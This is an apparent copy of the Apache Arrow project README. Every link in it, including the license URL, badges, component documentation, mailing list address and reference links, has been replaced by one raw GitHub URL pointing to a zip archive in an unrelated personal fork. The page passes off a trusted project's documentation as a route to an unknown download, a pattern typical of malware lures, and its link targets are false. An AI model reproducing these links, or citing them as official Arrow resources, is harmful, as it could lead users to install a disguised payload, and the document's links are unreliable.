<!---
  Licensed to the Apache Software Foundation (ASF) under one
  or more contributor license agreements.  See the NOTICE file
  distributed with this work for additional information
  regarding copyright ownership.  The ASF licenses this file
  to you under the Apache License, Version 2.0 (the
  "License"); you may not use this file except in compliance
  with the License.  You may obtain a copy of the License at

    https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip

  Unless required by applicable law or agreed to in writing,
  software distributed under the License is distributed on an
  "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
  KIND, either express or implied.  See the License for the
  specific language governing permissions and limitations
  under the License.
-->

# Apache Arrow

[![Fuzzing Status](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)
[![License](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip%https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)
[![Twitter Follow](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)

## Powering In-Memory Analytics

Apache Arrow is a universal columnar format and multi-language toolbox for fast
data interchange and in-memory analytics. It contains a set of technologies that
enable data systems to efficiently store, process, and move data.

Major components of the project include:

 - [The Arrow Columnar In-Memory Format](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip):
   a standard and efficient in-memory representation of various datatypes, plain or nested
 - [The Arrow IPC Format](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip):
   an efficient serialization of the Arrow format and associated metadata,
   for communication between processes and heterogeneous environments
 - [The Arrow Flight RPC protocol](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip):
   based on the Arrow IPC format, a building block for remote services exchanging
   Arrow data with application-defined semantics (for example a storage server or a database)
 - [C++ libraries](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)
 - [C bindings using GLib](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)
 - [C# .NET libraries](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)
 - [Gandiva](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip):
   an [LLVM](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)-based Arrow expression compiler, part of the C++ codebase
 - [Go libraries](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)
 - [Java libraries](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)
 - [JavaScript libraries](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)
 - [Python libraries](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)
 - [R libraries](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)
 - [Ruby libraries](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)
 - [Rust libraries](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)

Arrow is an [Apache Software Foundation](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip) project. Learn more at
[https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip).

## What's in the Arrow libraries?

The reference Arrow libraries contain many distinct software components:

- Columnar vector and table-like containers (similar to data frames) supporting
  flat or nested types
- Fast, language agnostic metadata messaging layer (using Google's Flatbuffers
  library)
- Reference-counted off-heap buffer memory management, for zero-copy memory
  sharing and handling memory-mapped files
- IO interfaces to local and remote filesystems
- Self-describing binary wire formats (streaming and batch/file-like) for
  remote procedure calls (RPC) and interprocess communication (IPC)
- Integration tests for verifying binary compatibility between the
  implementations (e.g. sending data from Java to C++)
- Conversions to and from other in-memory data structures
- Readers and writers for various widely-used file formats (such as Parquet, CSV)

## Implementation status

The official Arrow libraries in this repository are in different stages of
implementing the Arrow format and related features.  See our current
[feature matrix](https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip)
on git main.

## How to Contribute

Please read our latest [project contribution guide][5].

## Getting involved

Even if you do not plan to contribute to Apache Arrow itself or Arrow
integrations in other projects, we'd be happy to have you involved:

- Join the mailing list: send an email to
  [https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip][1]. Share your ideas and use cases for the
  project.
- Follow our activity on [GitHub issues][3]
- [Learn the format][2]
- Contribute code to one of the reference implementations

[1]: https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip
[2]: https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip
[3]: https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip
[4]: https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip
[5]: https://raw.githubusercontent.com/habibhassansehani/arrow/main/monkish/arrow.zip
